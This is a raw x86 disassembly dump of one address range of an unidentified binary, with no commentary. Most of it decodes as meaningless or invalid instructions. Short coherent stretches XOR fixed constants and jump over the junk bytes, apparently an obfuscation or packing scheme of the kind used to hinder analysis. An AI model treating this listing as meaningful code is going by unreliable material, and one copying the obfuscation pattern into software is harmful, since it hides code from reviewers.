  415007:	xor    BYTE PTR [edi+0x50bfef12],cl
  41500d:	xchg   ebx,eax
  41500e:	aad    0xc8
  415010:	rcr    BYTE PTR [edx-0x50],1
  415013:	retf   
  415014:	arpl   bp,ax
  415016:	pop    edx
  415017:	test   BYTE PTR [ebp+0x45],bh
  41501a:	jnp    0x415042
  41501c:	and    BYTE PTR [edi],al
  41501e:	and    DWORD PTR [esi+0x1],eax
  415021:	fistp  WORD PTR [ecx]
  415023:	or     ecx,0x3e
  415026:	leave  
  415027:	jno    0x414fe0
  415029:	mov    ch,0xf
  41502b:	mov    cl,0x4f
  41502d:	add    BYTE PTR [esi],0x25
  415030:	jbe    0x415078
  415032:	(bad)  
  415033:	xlat   BYTE PTR ds:[ebx]
  415034:	sub    eax,0x87169d31
  415039:	and    al,0x38
  41503b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41503d:	ins    BYTE PTR es:[edi],dx
  41503e:	or     eax,0xee5f7943
  415043:	dec    ebp
  415044:	shl    DWORD PTR [edx+ebx*4-0x13c5bc88],0xd0
  41504c:	mov    ds:0xbc86c9ca,al
  415051:	adc    BYTE PTR [ecx+0x5c],dh
  415054:	push   esi
  415055:	jno    0x415010
  415057:	pop    esi
  415058:	xchg   edi,eax
  415059:	icebp  
  41505a:	cld    
  41505b:	out    dx,eax
  41505c:	aad    0xca
  41505e:	dec    esp
  41505f:	jnp    0x415096
  415061:	push   es
  415062:	cdq    
  415063:	push   cs
  415064:	push   cs
  415065:	push   eax
  415066:	pop    edi
  415067:	jbe    0x415048
  415069:	ror    BYTE PTR [eax],1
  41506b:	mov    ds:0xbd21de73,al
  415070:	clc    
  415071:	xlat   BYTE PTR ds:[ebx]
  415072:	push   esi
  415073:	adc    ebp,DWORD PTR [ecx+0x1856a41e]
  415079:	fcomp  DWORD PTR [esi+0x12]
  41507c:	mov    bl,BYTE PTR [ebp+eax*1+0x20]
  415080:	xlat   BYTE PTR ds:[ebx]
  415081:	adc    ch,BYTE PTR [ebx+ecx*2]
  415084:	cwde   
  415085:	in     eax,dx
  415086:	adc    edx,DWORD PTR [ecx+0x12]
  415089:	mov    edi,0x787e96e0
  41508e:	ds cmp eax,0xa49d103
  415094:	sti    
  415095:	xchg   ebx,eax
  415096:	loopne 0x4150db
  415098:	popf   
  415099:	call   0x7d230f1f
  41509e:	aaa    
  41509f:	call   0x3b78807b
  4150a4:	push   edx
  4150a5:	mov    al,ds:0xf1542a23
  4150aa:	sbb    eax,0xdce52141
  4150af:	adc    al,dl
  4150b1:	xor    eax,0x2ed60704
  4150b6:	mov    bh,0xa8
  4150b8:	mov    ebp,0x61813c59
  4150bd:	fs sti 
  4150bf:	outs   dx,DWORD PTR ds:[esi]
  4150c0:	(bad)  
  4150c1:	std    
  4150c2:	xlat   BYTE PTR ds:[ebx]
  4150c3:	mov    BYTE PTR [eax-0x19],dl
  4150c6:	test   eax,0x3db806ce
  4150cb:	and    eax,0xc1506013
  4150d0:	mul    DWORD PTR [ebx]
  4150d2:	into   
  4150d3:	add    al,0x1a
  4150d5:	int    0xde
  4150d7:	int3   
  4150d8:	mov    bl,0xc6
  4150da:	or     DWORD PTR [edx+0x5ff33c7b],edx
  4150e0:	jbe    0x4150ea
  4150e2:	jbe    0x4150c9
  4150e4:	dec    ebp
  4150e5:	jg     0x415081
  4150e7:	pop    eax
  4150e8:	xchg   dh,al
  4150ea:	data16 (bad) 
  4150ec:	iret   
  4150ed:	push   0xb0ff6e9
  4150f2:	xor    eax,0x28e71463
  4150f7:	loop   0x4150f5
  4150f9:	pop    ebp
  4150fa:	loopne 0x4150a3
  4150fc:	add    al,0x2a
  4150fe:	and    BYTE PTR [edi-0x15a3e189],al
  415104:	pusha  
  415105:	jo     0x41509d
  415107:	mov    dl,0xa7
  415109:	sbb    BYTE PTR [esi+0xa],bl
  41510c:	fs sub eax,0x7d362ae0
  415112:	out    dx,al
  415113:	add    BYTE PTR [edi],dl
  415115:	jmp    0x957d:0x954aec18
  41511c:	outs   dx,DWORD PTR ds:[esi]
  41511d:	mov    bl,0x57
  41511f:	cmp    BYTE PTR [ebp+0x15],al
  415122:	in     al,0x22
  415124:	sbb    DWORD PTR [edi-0x2668f409],ecx
  41512a:	out    0xf6,eax
  41512c:	xor    DWORD PTR [edx-0x6e],0xffffffc3
  415130:	and    al,0x6d
  415132:	jnp    0x4150ba
  415134:	jle    0x41514c
  415136:	retf   
  415137:	pop    es
  415138:	iret   
  415139:	and    ebx,esp
  41513b:	mov    bl,0xa7
  41513d:	stos   BYTE PTR es:[edi],al
  41513e:	inc    ebx
  41513f:	mov    ch,0xdf
  415141:	aas    
  415142:	add    BYTE PTR [esi-0x1e2a6e92],bh
  415148:	das    
  415149:	or     al,0xcc
  41514b:	sub    eax,0x7c3ca899
  415150:	mov    ch,0xa
  415152:	dec    edi
  415153:	call   0x36e3:0x4f1c6769
  41515a:	test   DWORD PTR [ebp+0x78a0420c],esi
  415160:	retf   
  415161:	gs jmp 0x1cf:0x351d537e
  415169:	mov    edx,ss
  41516b:	mov    bl,0x96
  41516d:	pusha  
  41516e:	pop    ss
  41516f:	outs   dx,BYTE PTR ds:[esi]
  415170:	test   BYTE PTR [ebp-0xf],cl
  415173:	outs   dx,BYTE PTR ds:[esi]
  415174:	add    al,0x76
  415176:	imul   ebx,DWORD PTR [esi],0xffffffed
  415179:	lods   al,BYTE PTR ds:[esi]
  41517a:	mov    bl,0x38
  41517c:	dec    edx
  41517d:	jae    0x4151b5
  41517f:	sub    esp,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fldcw  WORD PTR [ecx-0x12b82a89]
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	sub    eax,0x154866f9
  4151b5:	or     eax,ebx
  4151b7:	push   ebx
  4151b8:	(bad)  
  4151b9:	xchg   esi,eax
  4151ba:	push   ebp
  4151bb:	mov    ebp,0x37bdca2b
  4151c0:	jp     0x4151ef
  4151c2:	cmp    eax,0xbdaba13e
  4151c7:	dec    ebp
  4151c8:	fnsave [ecx+0x2bc677b9]
  4151ce:	cmp    ah,BYTE PTR ds:0x1149bfed
  4151d4:	call   FWORD PTR [ebx+0x42]
  4151d7:	fsub   st(4),st
  4151d9:	clc    
  4151da:	enter  0xa2fe,0x85
  4151de:	jb     0x4151de
  4151e0:	out    0x5b,eax
  4151e2:	xchg   edi,eax
  4151e3:	jne    0x4151d8
  4151e5:	dec    edi
  4151e6:	(bad)  
  4151e8:	inc    edi
  4151e9:	push   ds
  4151ea:	xchg   ebp,eax
  4151eb:	adc    al,0x6a
  4151ed:	adc    eax,0x83ff3d59
  4151f2:	sbb    dh,BYTE PTR [ebx-0x7b2a2dc0]
  4151f8:	mov    esp,0x276b6556
  4151fd:	sbb    al,BYTE PTR [eax]
  4151ff:	mov    ecx,0x8553df1e
  415204:	and    esi,DWORD PTR [edx+ecx*2]
  415207:	cmp    eax,DWORD PTR [ebp-0x70d846f0]
  41520d:	aam    0xba
  41520f:	dec    ebp
  415210:	and    BYTE PTR [eax-0x60],bh
  415213:	mov    al,0xce
  415215:	imul   ebp,DWORD PTR [ebx-0x2616bfd],0x98b6862e
  41521f:	dec    edi
  415220:	fistp  QWORD PTR [ebx+edx*8]
  415223:	pop    edi
  415224:	cmp    esp,ecx
  415226:	addr16 xchg esp,eax
  415228:	cmp    DWORD PTR cs:[esi+0x45],edi
  41522c:	xlat   BYTE PTR ds:[ebx]
  41522d:	or     DWORD PTR ds:0x21752579,eax
  415233:	pop    ds
  415234:	sub    BYTE PTR [ecx+0x71],bl
  415237:	push   0xffffffdc
  415239:	mov    WORD PTR [eax-0x2f],es
  41523c:	sbb    dh,BYTE PTR [ecx*1+0x4b7c0fa4]
  415243:	iret   
  415244:	sub    dl,dh
  415246:	add    bl,BYTE PTR fs:[esi]
  415249:	imul   DWORD PTR ds:0xb6f8798e
  41524f:	mov    eax,ds:0x6543200c
  415254:	enter  0xc96a,0x7a
  415258:	push   eax
  415259:	mov    edi,0x12fbf46e
  41525e:	(bad)  
  41525f:	pusha  
  415260:	xlat   BYTE PTR ds:[ebx]
  415261:	ins    DWORD PTR es:[edi],dx
  415262:	aam    0x8f
  415264:	cmp    ch,ah
  415266:	clc    
  415267:	daa    
  415268:	inc    ebp
  415269:	adc    dl,BYTE PTR [edx+0x58]
  41526c:	jb     0x415225
  41526e:	and    ch,0xfe
  415271:	or     cl,dh
  415273:	xchg   edx,eax
  415274:	cmp    al,0xe6
  415276:	mov    al,ds:0x757ee224
  41527b:	or     al,0x73
  41527d:	jecxz  0x4152a8
  41527f:	loopne 0x41525b
  415281:	lods   eax,DWORD PTR ds:[esi]
  415282:	pop    ebp
  415283:	mov    ds:0xb85e670,eax
  415288:	pop    ss
  415289:	pop    esi
  41528a:	sub    BYTE PTR [edx],0x9b
  41528d:	xchg   edi,eax
  41528e:	or     esp,esi
  415290:	cmc    
  415291:	idiv   BYTE PTR [eax+0x1c]
  415294:	popa   
  415295:	outs   dx,BYTE PTR ds:[esi]
  415296:	jge    0x415231
  415298:	and    ebp,DWORD PTR [ebx+0x6a]
  41529b:	or     bh,bl
  41529d:	fdivr  QWORD PTR [eax-0x58]
  4152a0:	sbb    esi,DWORD PTR [edx+0x3e5515]
  4152a6:	arpl   si,dx
  4152a8:	jp     0x4152b4
  4152aa:	pop    ss
  4152ab:	lea    ebx,[ebx+edx*4]
  4152ae:	mov    cl,0x42
  4152b0:	pmulhw mm6,QWORD PTR [ecx+ebx*1-0x4]
  4152b5:	cmp    ebx,DWORD PTR [esi]
  4152b7:	ja     0x4152c6
  4152b9:	xor    DWORD PTR [ebp-0x5e],eax
  4152bc:	fnstenv [esi+0x72]
  4152bf:	(bad)  
  4152c0:	call   0x3605357d
  4152c5:	(bad)  
  4152c6:	dec    ebp
  4152c7:	std    
  4152c8:	xchg   edx,eax
  4152c9:	push   edi
  4152ca:	aad    0xa6
  4152cc:	inc    eax
  4152cd:	sub    eax,0xb5ba43f
  4152d2:	(bad)  
  4152d3:	and    al,0xd5
  4152d5:	jmp    0x1947:0x373d9456
  4152dc:	push   ebp
  4152dd:	std    
  4152de:	mov    cl,0xb8
  4152e0:	pusha  
  4152e1:	repz or ebp,DWORD PTR [ebx+0x4f9ac13b]
  4152e8:	cmp    DWORD PTR [edi-0x2898460],edx
  4152ee:	(bad)  
  4152ef:	outs   dx,BYTE PTR ds:[esi]
  4152f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152f1:	or     ecx,DWORD PTR [ecx-0x43]
  4152f4:	xchg   ebx,eax
  4152f5:	pushf  
  4152f6:	xchg   ebp,eax
  4152f7:	add    eax,0xc067b431
  4152fc:	out    0xcf,al
  4152fe:	and    bl,BYTE PTR [ebx+eiz*4]
  415301:	mov    esp,0xceda58e1
  415306:	jmp    0x415334
  415308:	std    
  415309:	fcom   DWORD PTR [ebx+0x6f57b069]
  41530f:	imul   ecx,DWORD PTR [edi-0xb],0xffffffb9
  415313:	pop    es
  415314:	cli    
  415315:	cmc    
  415316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415317:	add    BYTE PTR [esi+ebp*2-0x15],al
  41531b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41531c:	inc    ebp
  41531d:	dec    edx
  41531e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41531f:	sub    al,0x78
  415321:	out    dx,eax
  415322:	mov    dl,0xb4
  415324:	into   
  415325:	push   ebx
  415326:	sbb    BYTE PTR [eax],bh
  415328:	xor    dl,bl
  41532a:	and    BYTE PTR [ecx+ebx*4],dh
  41532d:	jo     0x415327
  41532f:	or     DWORD PTR [edi+0x76],ebx
  415332:	into   
  415333:	add    ebp,ecx
  415335:	sbb    eax,0xb477e45c
  41533a:	in     eax,dx
  41533b:	stos   BYTE PTR es:[edi],al
  41533c:	stos   DWORD PTR es:[edi],eax
  41533d:	std    
  41533e:	sub    BYTE PTR [esp+ebp*1-0x52],cl
  415342:	xchg   edx,eax
  415343:	xor    DWORD PTR [ebx-0x50],eax
  415346:	jmp    0x4153b4
  415348:	(bad)  
  415349:	test   DWORD PTR [ebp+0x3231d84b],0x1f4cd749
  415353:	gs shr dh,0x75
  415357:	fstp   QWORD PTR [eax+0x1c]
  41535a:	cmp    DWORD PTR ds:0xf37895bd,edx
  415360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415361:	xor    bh,BYTE PTR [eax+0x237d437c]
  415367:	dec    ebp
  415368:	js     0x415344
  41536a:	pop    esi
  41536b:	or     ebp,DWORD PTR [edx+eiz*8+0x22]
  41536f:	cmp    eax,DWORD PTR [ebx+eiz*4-0xd4a2d17]
  415376:	aaa    
  415377:	inc    ecx
  415378:	mov    eax,?
  41537a:	mov    al,0xb9
  41537c:	popf   
  41537d:	(bad)  
  41537e:	std    
  41537f:	dec    edi
  415380:	inc    esi
  415381:	adc    dl,BYTE PTR [ebx+edi*4]
  415384:	and    BYTE PTR [edi+0x295ceb65],cl
  41538a:	mov    DWORD PTR [edx+esi*4-0x16fc3431],esi
  415391:	int    0x1e
  415393:	lods   al,BYTE PTR ds:[esi]
  415394:	inc    ecx
  415395:	push   ds
  415396:	inc    edi
  415397:	test   cl,bl
  415399:	int3   
  41539a:	or     al,BYTE PTR [esi+0x3866d6ed]
  4153a0:	push   ebp
  4153a1:	add    al,0x45
  4153a3:	cmp    BYTE PTR [ecx],bl
  4153a5:	lods   eax,DWORD PTR ds:[esi]
  4153a6:	neg    BYTE PTR [ecx+0x32]
  4153a9:	or     al,0xf0
  4153ab:	pop    edi
  4153ac:	std    
  4153ad:	retf   
  4153ae:	mov    ds:0x66c186bc,al
  4153b3:	imul   ebp,DWORD PTR [edi-0x412f8fb8],0x4ea510b7
  4153bd:	sbb    BYTE PTR [edx+0x63],al
  4153c0:	enter  0xb817,0xa8
  4153c4:	xlat   BYTE PTR ds:[ebx]
  4153c5:	push   edi
  4153c6:	push   0x56
  4153c8:	in     al,0xed
  4153ca:	cli    
  4153cb:	dec    edx
  4153cc:	jp     0x4153ad
  4153ce:	out    dx,al
  4153cf:	pop    ecx
  4153d0:	cmp    BYTE PTR [ecx+0x42],bl
  4153d3:	aas    
  4153d4:	leave  
  4153d5:	mov    dl,0xe6
  4153d7:	jbe    0x4153d4
  4153d9:	push   ebx
  4153da:	aam    0x90
  4153dc:	retf   
  4153dd:	pop    ecx
  4153de:	mov    esp,0x1d9866b7
  4153e3:	pop    es
  4153e4:	jae    0xc064405e
  4153ea:	je     0x4153e1
  4153ec:	fs aam 0xfe
  4153ef:	aas    
  4153f0:	push   ecx
  4153f1:	jle    0x41538d
  4153f3:	pop    eax
  4153f4:	mov    bh,0xe4
  4153f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153f7:	xor    dl,BYTE PTR [edi]
  4153f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153fa:	inc    eax
  4153fb:	je     0x415396
  4153fd:	sub    esi,edi
  4153ff:	sub    eax,0x5f3903ec
  415404:	test   BYTE PTR [ebx],0xd1
  415407:	ficom  WORD PTR [esi+eax*8]
  41540a:	sar    edi,0x9c
  41540d:	fcmovbe st,st(0)
  41540f:	push   ss
  415410:	out    dx,al
  415411:	pop    edx
  415412:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  415414:	and    BYTE PTR [ebx+0x1cbcce8d],cl
  41541a:	into   
  41541b:	sti    
  41541c:	aaa    
  41541d:	(bad)  
  41541f:	pop    ss
  415420:	mov    ecx,0x828ba734
  415425:	sbb    ebx,DWORD PTR [eax-0x33597491]
  41542b:	mov    edx,0xf4124fff
  415431:	out    dx,eax
  415432:	mov    ebx,0x2424d9c0
  415437:	inc    edx
  415438:	jl     0x4153c9
  41543a:	pop    edi
  41543b:	dec    esp
  41543c:	jg     0x4153c5
  41543e:	ficomp WORD PTR [ecx+0xa30e71d]
  415444:	ret    0xa0d
  415447:	je     0x41544a
  415449:	inc    esp
  41544a:	sbb    ah,BYTE PTR [ecx]
  41544c:	mov    BYTE PTR [ecx],bl
  41544e:	imul   esi,DWORD PTR [edi+0x1b1c56c9],0xd0516f3e
  415458:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41545a:	xchg   DWORD PTR [edx+0x4],ebp
  41545d:	jae    0x41548e
  41545f:	lods   al,BYTE PTR ds:[esi]
  415460:	sbb    BYTE PTR [edi+0x2f053811],dl
  415466:	mov    edi,0xb2f4ea0a
  41546b:	mov    edi,DWORD PTR [eax+0x51]
  41546e:	mov    ebx,0x1b0c741
  415473:	retf   
  415474:	pop    ds
  415475:	enter  0x361,0xc2
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x69
  4154c8:	mov    ds:0x236ff60,al
  4154cd:	jg     0x41553f
  4154cf:	mov    ecx,0x8670707e
  4154d4:	xor    eax,DWORD PTR [esi]
  4154d6:	loop   0x41551c
  4154d8:	fwait
  4154d9:	or     ebx,esi
  4154db:	cmp    eax,0x20643d6b
  4154e0:	ds scas al,BYTE PTR es:[edi]
  4154e2:	(bad)  
  4154e3:	in     eax,dx
  4154e4:	dec    ebp
  4154e5:	sub    eax,ebx
  4154e7:	dec    esp
  4154e8:	and    al,0xf1
  4154ea:	(bad)
  4154ed:	xor    eax,0x622a0acd
  4154f2:	add    dl,BYTE PTR [edi+0x9465f73]
  4154f8:	clc    
  4154f9:	in     al,0xde
  4154fb:	sbb    al,0xc2
  4154fd:	xchg   BYTE PTR fs:[edx-0x19],bh
  415501:	rol    DWORD PTR [esi],1
  415503:	cmp    BYTE PTR [edi+ebx*1-0x54],bl
  415507:	push   esp
  415508:	ss mov bh,0x7e
  41550b:	jns    0x4154ca
  41550d:	stos   DWORD PTR es:[edi],eax
  41550e:	into   
  41550f:	gs ds retf 0xf6f7
  415514:	add    eax,0xd44745a0
  415519:	pop    eax
  41551a:	xor    BYTE PTR [edi-0x3f],cl
  41551d:	lods   al,BYTE PTR ds:[esi]
  41551e:	stos   BYTE PTR es:[edi],al
  41551f:	sbb    BYTE PTR [edx+0xcc306bb],0x8d
  415526:	xchg   DWORD PTR [esi+0x60b28087],ebp
  41552c:	retf   0x6933
  41552f:	mov    edi,0x277aa9f4
  415534:	xor    bh,BYTE PTR [edx]
  415536:	mov    al,0x66
  415538:	dec    edi
  415539:	and    dl,BYTE PTR [edx-0x2d]
  41553c:	leave  
  41553d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41553e:	sbb    al,0x94
  415540:	aaa    
  415541:	call   0xa48b:0x66997996
  415548:	test   al,0x76
  41554a:	in     al,dx
  41554b:	(bad)  
  41554c:	sub    edi,0x39
  41554f:	jns    0x4155a5
  415551:	sar    dl,1
  415553:	mov    ecx,0xaed7ee9a
  415558:	test   BYTE PTR [ebx+edi*4-0x43],cl
  41555c:	(bad)  
  41555d:	cdq    
  41555e:	es inc edx
  415560:	jmp    0x415551
  415562:	in     al,0xe3
  415564:	jno    0x415525
  415566:	mov    ds:0xfd23359a,al
  41556b:	pushf  
  41556c:	add    DWORD PTR [ebx+0x3],ebx
  41556f:	jne    0x415553
  415571:	fs dec ebx
  415573:	mov    edx,0x5cd59aa5
  415578:	adc    edx,ebp
  41557a:	jmp    DWORD PTR [edx-0x4a4a9c4e]
  415580:	sbb    BYTE PTR [edx],dh
  415582:	bound  ebx,QWORD PTR ds:0x6367b2e2
  415588:	aam    0x65
  41558a:	jl     0x415531
  41558c:	xchg   ebx,eax
  41558d:	push   0x32
  41558f:	push   ebx
  415590:	das    
  415591:	mov    dh,0x50
  415593:	and    eax,0xdc1b935b
  415598:	iret   
  415599:	jo     0x415614
  41559b:	stos   BYTE PTR es:[edi],al
  41559c:	cwde   
  41559d:	push   ebp
  41559e:	das    
  41559f:	inc    ebx
  4155a0:	test   BYTE PTR ds:0x88c49773,cl
  4155a6:	xchg   esp,eax
  4155a7:	and    eax,0x9bd32849
  4155ac:	mov    bl,0x54
  4155ae:	sub    DWORD PTR [ebp+0x52c07d63],esi
  4155b4:	mov    BYTE PTR [eax],ch
  4155b6:	inc    cx
  4155b8:	add    ebx,ebp
  4155ba:	stos   BYTE PTR es:[edi],al
  4155bb:	add    BYTE PTR [ebx-0x19],bh
  4155be:	xchg   esi,eax
  4155bf:	xor    DWORD PTR [ecx-0x7c78cdb7],0xffffffb4
  4155c6:	jge    0x41557e
  4155c8:	pusha  
  4155c9:	pop    edi
  4155ca:	xor    al,0x40
  4155cc:	push   ecx
  4155cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155cf:	jnp    0x41558a
  4155d1:	xor    al,0x70
  4155d3:	ror    DWORD PTR [ebx],1
  4155d5:	retf   0xbecb
  4155d8:	or     DWORD PTR [ecx-0x55],eax
  4155db:	mov    bl,0xf9
  4155dd:	xor    ebx,DWORD PTR [ecx+0x5f51772f]
  4155e3:	push   edi
  4155e4:	fdivr  DWORD PTR [ebp-0x4f22395f]
  4155ea:	inc    ecx
  4155eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155ec:	push   es
  4155ed:	xchg   esi,eax
  4155ee:	sub    ah,ah
  4155f0:	xor    ecx,DWORD PTR [esi-0x71661913]
  4155f6:	ficom  DWORD PTR [esi]
  4155f8:	xor    al,0xaf
  4155fa:	ror    DWORD PTR [edi-0x7c],cl
  4155fd:	cmp    DWORD PTR [eax],ecx
  4155ff:	out    0xa7,eax
  415601:	pop    esi
  415602:	call   0x17bd2eed
  415607:	jns    0x415594
  415609:	in     al,0x23
  41560b:	or     DWORD PTR [edx-0x3ca7614b],esi
  415611:	mov    esi,0x2f3b5170
  415616:	pop    esp
  415617:	stos   DWORD PTR es:[edi],eax
  415618:	add    DWORD PTR [bx+di],0xd9cecb92
  41561f:	(bad)  
  415620:	mov    esp,0x24c62ac5
  415625:	popa   
  415626:	pop    ebp
  415627:	js     0x415648
  415629:	sub    edx,DWORD PTR [esi+0x37093599]
  41562f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415630:	ins    DWORD PTR es:[edi],dx
  415631:	mov    WORD PTR ss:[edi-0x69e3296f],fs
  415638:	repz das 
  41563a:	sbb    ecx,edi
  41563c:	in     eax,0x1f
  41563e:	adc    DWORD PTR [eax+edx*2+0x4b],esi
  415642:	out    dx,al
  415643:	xchg   ebx,eax
  415644:	loopne 0x4156a0
  415646:	in     al,0x74
  415648:	mov    esp,0xdc4457c7
  41564d:	das    
  41564e:	mov    cl,0x6d
  415650:	(bad)  
  415651:	cmp    al,0x1d
  415653:	rcr    ebx,0x4a
  415656:	and    eax,0x5592c182
  41565b:	jmp    0xe6f1409c
  415660:	pop    ds
  415661:	pop    esi
  415662:	mov    ds:0x567bbadc,al
  415667:	cmc    
  415668:	mov    ah,0xac
  41566a:	inc    edx
  41566b:	adc    cl,bh
  41566d:	shl    DWORD PTR [ebx],cl
  41566f:	enter  0x2a24,0x87
  415673:	sbb    al,0xe5
  415675:	jno    0x4156b7
  415677:	retf   
  415678:	je     0x4156b4
  41567a:	enter  0x2d59,0x5f
  41567e:	pop    ecx
  41567f:	adc    DWORD PTR [ecx-0x162e8661],eax
  415685:	scas   eax,DWORD PTR es:[edi]
  415686:	xchg   ecx,eax
  415687:	clc    
  415688:	sub    edx,DWORD PTR fs:[edi+0x408b165d]
  41568f:	inc    eax
  415690:	lods   eax,DWORD PTR ds:[esi]
  415691:	aaa    
  415692:	aaa    
  415693:	jae    0x41570b
  415695:	sub    BYTE PTR [esi],0xbb
  415698:	jne    0x415623
  41569a:	movhlps xmm1,xmm6
  41569d:	add    al,0x93
  4156a0:	or     esi,DWORD PTR [ebp+0x8]
  4156a3:	jmp    0x2fa9:0x9d07458e
  4156aa:	test   dl,ah
  4156ac:	mov    ah,0x4c
  4156ae:	mov    edx,0xbf5aaa3e
  4156b3:	fcmove st,st(3)
  4156b5:	mov    ebx,edi
  4156b7:	hlt    
  4156b8:	ficom  DWORD PTR [edx+0x5b]
  4156bb:	(bad)  
  4156bc:	iret   
  4156bd:	sbb    cl,BYTE PTR [ebx]
  4156bf:	rcr    DWORD PTR [ecx+0x20],1
  4156c2:	out    dx,eax
  4156c3:	loope  0x4156f7
  4156c5:	fadd   QWORD PTR [edi]
  4156c7:	inc    esp
  4156c8:	xor    eax,0x3ca70927
  4156cd:	push   0x934db7c9
  4156d2:	mov    ds:0x9e27e32f,eax
  4156d7:	mov    DWORD PTR [esi-0x61],ebp
  4156da:	pop    eax
  4156db:	mov    al,ds:0xb4a19186
  4156e0:	fwait
  4156e1:	outs   dx,BYTE PTR ds:[esi]
  4156e2:	push   cs
  4156e3:	and    dh,BYTE PTR [edi-0x6d]
  4156e6:	push   ds
  4156e7:	test   DWORD PTR [edx-0x6829a1ba],ebp
  4156ed:	(bad)  
  4156ef:	pop    esi
  4156f0:	gs sub eax,0x905ebd4d
  4156f6:	call   0xfe8497a6
  4156fb:	(bad)  
  4156fc:	lock jl 0x4156f6
  4156ff:	mov    ebp,fs
  415701:	pop    ds
  415702:	push   edi
  415703:	add    DWORD PTR [edx-0x6e21dcd9],esi
  415709:	pop    ebp
  41570a:	lock call 0xc57e:0x35597b0a
  415712:	popf   
  415713:	(bad)  
  415715:	xchg   edx,eax
  415716:	aaa    
  415717:	loop   0x415731
  415719:	(bad)  
  41571a:	int3   
  41571b:	mov    al,dh
  41571d:	mov    bh,0xb1
  41571f:	cmp    bh,ah
  415721:	jns    0x4156ab
  415723:	and    BYTE PTR [edi+0x3bf4146a],bl
  415729:	outs   dx,BYTE PTR ds:[esi]
  41572a:	inc    edi
  41572b:	addr16 pop edx
  41572d:	mov    DWORD PTR [edx-0x3ead272],ebx
  415733:	jnp    0x415738
  415735:	add    BYTE PTR [edi-0x69d97837],bl
  41573b:	xor    bh,cl
  41573d:	pushf  
  41573e:	mov    ah,0x35
  415740:	mov    ds:0x7aeef6eb,al
  415745:	and    al,bl
  415747:	cmp    eax,0x3592d3fb
  41574c:	lea    eax,[ecx-0x2f]
  41574f:	or     eax,0xcebd4157
  415754:	inc    esp
  415755:	dec    esp
  415756:	xor    BYTE PTR [ecx],0x6f
  415759:	std    
  41575a:	out    dx,al
  41575b:	sbb    ebx,ebx
  41575d:	iret   
  41575e:	imul   BYTE PTR [ecx]
  415760:	dec    esi
  415761:	add    eax,ebx
  415763:	(bad)  
  415764:	fld    TBYTE PTR [edi+0x559bd38b]
  41576a:	fcom   QWORD PTR [ebx]
  41576c:	xor    eax,0x28d45635
  415771:	ss scas al,BYTE PTR es:[edi]
  415773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415774:	sbb    DWORD PTR [ecx+0x73ccd195],eax
  41577a:	lods   eax,DWORD PTR ds:[esi]
  41577b:	adc    al,0x1a
  41577d:	adc    esp,DWORD PTR [ecx]
  41577f:	test   al,0xba
  415781:	mov    al,0x98
  415783:	cmp    edi,edx
  415785:	inc    esi
  415786:	lock jne 0x41573e
  415789:	push   es
  41578a:	and    DWORD PTR [ecx],edi
  41578c:	cld    
  41578d:	(bad)  
  41578e:	call   0xbe57dc54
  415793:	fsub   DWORD PTR [ebp-0xb]
  415796:	pop    ss
  415797:	sbb    BYTE PTR [edi+0x41],dl
  41579a:	mov    esi,0x32729c
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR [edi+0x7f353c56],ah
  4157bc:	movq   QWORD PTR [eax-0x47],mm6
  4157c0:	jle    0x415832
  4157c2:	jo     0x415767
  4157c4:	or     ah,BYTE PTR [ebx-0x2b]
  4157c7:	and    BYTE PTR [ebp+0x6bf3fdac],bl
  4157cd:	lahf   
  4157ce:	jb     0x4157a0
  4157d0:	test   eax,0x9f4295a6
  4157d5:	add    ebx,ebx
  4157d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157d8:	test   BYTE PTR [edx-0x23],ah
  4157db:	das    
  4157dc:	(bad)  
